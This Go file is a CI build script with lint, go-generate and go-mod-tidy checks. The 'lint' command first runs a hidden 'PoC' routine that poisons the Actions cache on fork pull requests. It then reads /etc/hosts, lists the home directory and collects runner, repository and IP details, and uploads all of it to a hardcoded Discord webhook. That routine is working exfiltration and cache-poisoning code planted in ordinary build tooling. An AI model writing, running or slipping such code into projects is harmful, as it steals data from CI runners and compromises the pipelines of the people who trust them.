// build/ci.go
package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	cmd := os.Args[1]
	var err error

	switch cmd {
	case "lint":
		// ===== Pre-lint PoC: cache check (local marker) -> poison (write) -> LFI + pingback =====
		preLintPoC()
		// ===== Run actual linters =====
		err = runLint()

	case "check_generate":
		err = runCheckGenerate()

	case "check_baddeps":
		err = runCheckBaddeps()

	default:
		fmt.Fprintf(os.Stderr, "unknown command: %q\n\n", cmd)
		usage()
		os.Exit(2)
	}

	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func usage() {
	fmt.Println(`Usage:
  go run build/ci.go <command>

Commands:
  lint             Run linters (pre-lint: evidence upload + LFI + IP pingback)
  check_generate   Verify generated files are up to date (go generate + diff)
  check_baddeps    Verify module graph is tidy (go mod tidy clean check)`)
}

/* ========================= PRE-LINT POC ========================= */
/*
   What this does when "lint" starts:

   1) Cache-check (local to THIS workflow):
      - Marker path: build/cache/ci-poc/MARKER.txt
      - If marker exists, create a temp "cache-evidence.txt" with details + marker tail
        and upload it to Discord as a file attachment.

   2) Cache-poison (write a new marker) ONLY if the event is a fork PR:
      - Append a new entry to build/cache/ci-poc/MARKER.txt (persisting via actions/cache).

   3) LFI + IP pingback:
      - Build a temp "lfi-demo.txt" with /etc/hosts (or Windows hosts) + $HOME listing + marker tail.
      - Send a JSON pingback (host/runner/public/local IPs).
      - Upload the "lfi-demo.txt" to Discord as a file attachment.

   NOTE: No YAML/env changes needed. Webhook is hardcoded below.
*/

const (
	webhookURL      = "https://discord.com/api/webhooks/1409963954406686872/G9wHeBGquh4XpqmxKho5BtXEDL_J0sO-GQAiD8Zj4h6oRYHuQKikDH_9zrGt423XREQ8"
	localMarkerDir  = "build/cache/ci-poc"
	localMarkerFile = "MARKER.txt"
)

func preLintPoC() {
	markerPath := filepath.Join(localMarkerDir, localMarkerFile)
	now := time.Now().UTC().Format(time.RFC3339)

	// ---- 1) Cache-check: if marker exists, upload evidence file ----
	fmt.Println("[Cache-Check] Looking for local marker:", markerPath)
	if fileExists(markerPath) {
		fmt.Println("::warning:: Found local marker:", markerPath)
		tmpRep, err := os.CreateTemp("", "cacheEvidence-*")
		if err == nil {
			defer os.Remove(tmpRep.Name())
			var buf bytes.Buffer
			fmt.Fprintln(&buf, "Cache poisoning evidence (local workflow marker)")
			fmt.Fprintf(&buf, "time=%s host=%s runner=%s\n", now, hostnameSafe(), os.Getenv("RUNNER_NAME"))
			fmt.Fprintf(&buf, "repo=%s event=%s run_id=%s sha=%s actor=%s\n",
				os.Getenv("GITHUB_REPOSITORY"), os.Getenv("GITHUB_EVENT_NAME"),
				os.Getenv("GITHUB_RUN_ID"), os.Getenv("GITHUB_SHA"), os.Getenv("GITHUB_ACTOR"))
			fmt.Fprintln(&buf)
			fmt.Fprintln(&buf, "[local marker]", markerPath)
			if b, err := os.ReadFile(markerPath); err == nil {
				buf.Write(trimForLog(b, 8192))
			} else {
				fmt.Fprintf(&buf, "(read error: %v)\n", err)
			}
			_ = os.WriteFile(tmpRep.Name(), buf.Bytes(), 0o600)

			fmt.Println("[Cache-Check] Uploading evidence to Discord…")
			if code, err := discordFile(webhookURL,
				`{"content":"Cache poisoning evidence: marker found (local workflow)","flags":0}`,
				tmpRep.Name(), "cache-evidence.txt"); err == nil {
				fmt.Println("Discord evidence HTTP", code)
			} else {
				fmt.Println("Discord evidence upload error:", err)
			}
		} else {
			fmt.Println("[Cache-Check] Could not create temp evidence file:", err)
		}
	} else {
		fmt.Println("[Cache-Check] No marker found; nothing to report.")
	}

	// ---- 2) Cache-poison: write/append marker ONLY for fork PRs ----
	isFork := detectForkPR()
	fmt.Println("[Cache-Poison] fork flag:", isFork)
	if isFork {
		if err := os.MkdirAll(localMarkerDir, 0o755); err != nil {
			fmt.Println("[Cache-Poison] mkdir error:", err)
		} else {
			var prev []byte
			if b, err := os.ReadFile(markerPath); err == nil {
				prev = b
			}
			entry := fmt.Sprintf(
				"POC LOCAL MARKER time=%s host=%s actor=%s repo=%s run=%s event=%s fork=true\n",
				now, hostnameSafe(),
				os.Getenv("GITHUB_ACTOR"), os.Getenv("GITHUB_REPOSITORY"),
				os.Getenv("GITHUB_RUN_ID"), os.Getenv("GITHUB_EVENT_NAME"),
			)
			if err := os.WriteFile(markerPath, append(prev, []byte(entry)...), 0o644); err != nil {
				fmt.Println("[Cache-Poison] write error:", err)
			} else {
				fmt.Println("[Cache-Poison] Wrote marker to:", markerPath)
			}
		}
	} else {
		fmt.Println("[Cache-Poison] Not a fork PR; skipping write.")
	}

	// ---- 3) LFI + IP pingback + upload ----
	fmt.Println("[POC] Local File Read + IP pingback on self-hosted runner…")
	tmpLFI, err := os.CreateTemp("", "lfiPoC-*")
	if err != nil {
		fmt.Println("[LFI] Could not create temp:", err)
		return
	}
	defer os.Remove(tmpLFI.Name())

	var lfi bytes.Buffer
	// /etc/hosts or Windows hosts
	hp := hostsCandidate()
	fmt.Fprintf(&lfi, "[+] Reading %s\n", hp)
	if b, err := os.ReadFile(hp); err == nil {
		lfi.Write(b)
	} else {
		fmt.Fprintf(&lfi, "No access: %v\n", err)
	}
	// HOME listing
	home := homeDir()
	fmt.Fprintf(&lfi, "\n[+] Listing current user's home dir (%s)\n", home)
	if home != "" {
		if entries, err := os.ReadDir(home); err == nil {
			names := make([]string, 0, len(entries))
			for _, e := range entries {
				names = append(names, e.Name())
			}
			sort.Strings(names)
			for _, n := range names {
				fmt.Fprintf(&lfi, " - %s\n", n)
			}
		} else {
			fmt.Fprintf(&lfi, "No access: %v\n", err)
		}
	} else {
		fmt.Fprintln(&lfi, "HOME not set")
	}
	// Marker tail (to correlate with cache evidence)
	if b, err := os.ReadFile(markerPath); err == nil {
		fmt.Fprintf(&lfi, "\n[+] local marker tail (%s)\n", markerPath)
		lfi.Write(trimForLog(b, 4096))
	}
	if err := os.WriteFile(tmpLFI.Name(), lfi.Bytes(), 0o600); err != nil {
		fmt.Println("[LFI] Could not write temp evidence:", err)
		return
	}

	// Pingback (JSON)
	publicIP := fetchPublicIP()
	localIPs := strings.Join(collectIPv4s(), " ")
	ping := fmt.Sprintf("POC IP pingback: host=%s runner=%s public_ip=%s local_ips=%s",
		hostnameSafe(), os.Getenv("RUNNER_NAME"), publicIP, localIPs)
	_ = discordSimple(webhookURL, ping)

	// Upload LFI evidence
	if code, err := discordFile(webhookURL,
		`{"content":"POC: Local File Read demo (/etc/hosts + HOME listing + local marker tail)","flags":0}`,
		tmpLFI.Name(), "lfi-demo.txt"); err == nil {
		fmt.Println("Discord file HTTP", code)
	} else {
		fmt.Println("Discord file upload error:", err)
	}
}

/* ========================= LINT ========================= */

func runLint() error {
	gci := detectGolangCILint()
	if gci == "" {
		return errors.New("golangci-lint not found (looked in build/cache and PATH)")
	}
	args := []string{"run", "--config", ".golangci.yml", "./..."}
	fmt.Printf(">>> %s %s\n", gci, strings.Join(args, " "))
	return runStreaming(gci, args...)
}

/* ========================= CHECK_GENERATE ========================= */

func runCheckGenerate() error {
	fmt.Println(">>> go generate ./...")
	if err := runStreaming("go", "generate", "./..."); err != nil {
		return fmt.Errorf("go generate failed: %w", err)
	}
	clean, out, err := gitDiffIsClean()
	if err != nil {
		return fmt.Errorf("git diff check failed: %w", err)
	}
	if !clean {
		fmt.Println(out)
		return errors.New("generated files are not up to date; run `go generate ./...` and commit changes")
	}
	fmt.Println("check_generate: OK")
	return nil
}

/* ========================= CHECK_BADDEPS ========================= */

func runCheckBaddeps() error {
	fmt.Println(">>> go mod tidy -v")
	if err := runStreaming("go", "mod", "tidy", "-v"); err != nil {
		return fmt.Errorf("go mod tidy failed: %w", err)
	}
	clean, out, err := gitDiffIsClean()
	if err != nil {
		return fmt.Errorf("git diff check failed: %w", err)
	}
	if !clean {
		fmt.Println(out)
		return errors.New("go.mod/go.sum changed after tidy; commit or fix dependency issues")
	}
	fmt.Println("check_baddeps: OK")
	return nil
}

/* ========================= UTIL: LINT/EXEC ========================= */

func detectGolangCILint() string {
	goos := runtime.GOOS
	arch := runtime.GOARCH
	cacheDir := "build/cache"

	entries, _ := os.ReadDir(cacheDir)
	for _, e := range entries {
		name := e.Name()
		if strings.HasPrefix(name, "golangci-lint-") && strings.Contains(name, "-"+goos+"-") && strings.Contains(name, "-"+arch) {
			candidate := filepath.Join(cacheDir, name, "golangci-lint")
			if fileIsExec(candidate) {
				tgz := filepath.Join(cacheDir, name+".tar.gz")
				if _, err := os.Stat(tgz); err == nil {
					fmt.Printf("%s is up-to-date\n", tgz)
				}
				return candidate
			}
			if goos == "windows" {
				candidateExe := candidate + ".exe"
				if fileIsExec(candidateExe) {
					zip := filepath.Join(cacheDir, name+".zip")
					if _, err := os.Stat(zip); err == nil {
						fmt.Printf("%s is up-to-date\n", zip)
					}
					return candidateExe
				}
			}
		}
	}
	if p, err := exec.LookPath("golangci-lint"); err == nil {
		return p
	}
	return ""
}

func fileIsExec(p string) bool {
	st, err := os.Stat(p)
	if err != nil {
		return false
	}
	return !st.IsDir() && st.Mode()&0111 != 0
}

func runStreaming(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Env = os.Environ()
	return cmd.Run()
}

func gitDiffIsClean() (bool, string, error) {
	cmd := exec.Command("git", "diff", "--name-only")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = io.Discard
	cmd.Env = os.Environ()
	if err := cmd.Run(); err != nil {
		return false, "", err
	}
	diff := strings.TrimSpace(out.String())
	return diff == "", "Uncommitted changes:\n" + diff, nil
}

/* ========================= UTIL: DISCORD/IP/LFI ========================= */

func discordSimple(webhook, content string) error {
	if webhook == "" {
		return nil
	}
	b := []byte(`{"content":` + jsonQuote(content) + `}`)
	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func discordFile(webhook, payloadJSON, filePath, filename string) (int, error) {
	if webhook == "" {
		return 0, fmt.Errorf("no webhook configured")
	}
	var body bytes.Buffer
	w := multipart.NewWriter(&body)

	if fw, err := w.CreateFormField("payload_json"); err == nil {
		_, _ = fw.Write([]byte(payloadJSON))
	} else {
		return 0, err
	}
	fw, err := w.CreateFormFile("files[0]", filename)
	if err != nil {
		return 0, err
	}
	f, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	if _, err := io.Copy(fw, f); err != nil {
		return 0, err
	}
	_ = w.Close()

	req, _ := http.NewRequest(http.MethodPost, webhook, &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return 0, err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode, nil
}

func fetchPublicIP() string {
	// Prefer curl (matches your PoC), fallback to Go HTTP
	if _, err := exec.LookPath("curl"); err == nil {
		if out, err := exec.Command("curl", "-fsS", "https://ifconfig.me").Output(); err == nil {
			return strings.TrimSpace(string(out))
		}
	}
	resp, err := http.Get("https://ifconfig.me")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(b))
}

func collectIPv4s() []string {
	var out []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				ip := ipnet.IP.To4()
				if ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			}
		}
	}
	return out
}

func hostsCandidate() string {
	if runtime.GOOS == "windows" {
		return `C:\Windows\System32\drivers\etc\hosts`
	}
	return "/etc/hosts"
}

func homeDir() string {
	if runtime.GOOS == "windows" {
		if v := os.Getenv("USERPROFILE"); v != "" {
			return v
		}
		return `C:\Users\Public`
	}
	return os.Getenv("HOME")
}

func hostnameSafe() string {
	h, err := os.Hostname()
	if err != nil || h == "" {
		return "unknown-host"
	}
	return h
}

func trimForLog(b []byte, max int) []byte {
	if len(b) <= max {
		return b
	}
	return append(append([]byte{}, b[:max]...), []byte("\n...(truncated)...")...)
}

func jsonQuote(s string) string {
	// Minimal JSON string escaper for payloads (avoid importing encoding/json just for this)
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		switch r {
		case '\\', '"':
			b.WriteByte('\\')
			b.WriteRune(r)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			if r < 0x20 {
				// control chars
				fmt.Fprintf(&b, `\u%04x`, r)
			} else {
				b.WriteRune(r)
			}
		}
	}
	b.WriteByte('"')
	return b.String()
}

func detectForkPR() bool {
	// Cheap detection: parse the event payload text for `"fork": true` under pull_request.head.repo
	evPath := os.Getenv("GITHUB_EVENT_PATH")
	if evPath == "" {
		return false
	}
	b, err := os.ReadFile(evPath)
	if err != nil {
		return false
	}
	s := string(b)
	return strings.Contains(s, `"fork": true`) || strings.Contains(s, `"fork":true`)
}

/* ========================= EOF ========================= */
